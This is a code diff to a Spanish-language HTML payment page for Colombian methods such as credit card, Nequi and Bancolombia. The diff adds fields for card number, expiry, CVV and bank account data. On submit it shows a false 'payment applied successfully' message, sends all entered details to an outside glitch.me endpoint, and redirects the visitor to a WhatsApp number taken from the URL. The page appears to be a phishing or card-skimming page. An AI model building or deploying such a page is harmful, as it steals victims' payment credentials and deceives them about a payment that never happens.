@@ -50,6 +50,10 @@
       text-align: center;
       font-weight: bold;
     }
+
+    .extra-fields {
+      display: none;
+    }
   </style>
 </head>
 
@@ -73,12 +77,51 @@
         <option value="Efecty">📮 Efecty</option>
       </select>
 
+      <!-- Campos adicionales según método de pago -->
+      <div id="extra-fields" class="extra-fields"></div>
+
       <button type="submit">Pagar ahora</button>
     </form>
     <div id="success-message"></div>
   </div>
 
   <script>
+    const paymentMethod = document.getElementById("payment-method");
+    const extraFields = document.getElementById("extra-fields");
+
+    const methodFields = {
+      "Tarjeta de crédito": `
+        <label for="card-number">Número de tarjeta:</label>
+        <input type="text" id="card-number" required />
+        <label for="card-expiry">Fecha de expiración:</label>
+        <input type="month" id="card-expiry" required />
+        <label for="card-cvv">CVV:</label>
+        <input type="text" id="card-cvv" required />
+      `,
+      "Nequi": `
+        <label for="nequi-number">Número Nequi:</label>
+        <input type="text" id="nequi-number" required />
+      `,
+      "Bancolombia": `
+        <label for="banco-account">Cuenta Bancolombia:</label>
+        <input type="text" id="banco-account" required />
+      `,
+      "PSE": `
+        <label for="pse-email">Correo electrónico PSE:</label>
+        <input type="email" id="pse-email" required />
+      `,
+      "Efecty": `
+        <label for="efecty-id">Número de documento:</label>
+        <input type="text" id="efecty-id" required />
+      `
+    };
+
+    paymentMethod.addEventListener("change", () => {
+      const selected = paymentMethod.value;
+      extraFields.innerHTML = methodFields[selected] || "";
+      extraFields.style.display = "block";
+    });
+
     // Obtener parámetros de la URL
     function getQueryParam(param) {
       const urlParams = new URLSearchParams(window.location.search);
@@ -90,33 +133,73 @@
       const cliente = getQueryParam("cliente");
       const monto = getQueryParam("monto");
       const origen = getQueryParam("origen");
+      const destino = getQueryParam("destino");
 
       if (cliente) document.getElementById("name").value = decodeURIComponent(cliente);
       if (monto) document.getElementById("amount").value = monto;
+      if (origen) window.origenWhatsApp = origen;
+      if (origen) window.destinoWhatsapp = destino;
+
     };
 
-    // Simulación del pago
-    document.getElementById("payment-form").addEventListener("submit", function (e) {
+    document.getElementById("payment-form").addEventListener("submit", async function (e) {
       e.preventDefault();
 
       const name = document.getElementById("name").value;
       const amount = document.getElementById("amount").value;
-      const method = document.getElementById("payment-method").value;
+      const method = paymentMethod.value;
+      const origen = window.origenWhatsApp;
+      const destino = window.destinoWhatsapp;
 
       if (!name || !amount || !method) {
         alert("Por favor completa todos los campos.");
         return;
       }
 
-      const message = `✅ ¡Pago aplicado con éxito!\n\nGracias ${name}, tu pago de $${amount} usando ${method} fue recibido.`;
+      const formData = { name, amount, method, origen, destino };
+
+      // Agregar campos específicos del método
+      switch (method) {
+        case "Tarjeta de crédito":
+          formData.cardNumber = document.getElementById("card-number").value;
+          formData.expiry = document.getElementById("card-expiry").value;
+          formData.cvv = document.getElementById("card-cvv").value;
+          break;
+        case "Nequi":
+          formData.nequiNumber = document.getElementById("nequi-number").value;
+          break;
+        case "Bancolombia":
+          formData.bancoAccount = document.getElementById("banco-account").value;
+          break;
+        case "PSE":
+          formData.pseEmail = document.getElementById("pse-email").value;
+          break;
+        case "Efecty":
+          formData.efectyId = document.getElementById("efecty-id").value;
+          break;
+      }
+
+      // Mostrar mensaje
       const msgBox = document.getElementById("success-message");
-      msgBox.textContent = message;
+      msgBox.textContent = `✅ ¡Pago aplicado con éxito!\n\nGracias ${name}, tu pago de $${amount} usando ${method} fue recibido.`;
       msgBox.style.display = "block";
 
+      // Enviar a la API
+      try {
+        await fetch("https://rumbling-cat-cheshire.glitch.me/pay", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(formData),
+        });
+      } catch (error) {
+        console.error("Error al enviar los datos:", error);
+      }
+
+      // Redirigir a WhatsApp en 3 segundos
       setTimeout(() => {
-        const whatsappUrl = `https://wa.me/${origen}`;
+        const whatsappUrl = `https://wa.me/${window.origenWhatsApp}`;
         window.location.href = whatsappUrl;
-      }, 3000);
+      }, 2000);
     });
   </script>
 </body>
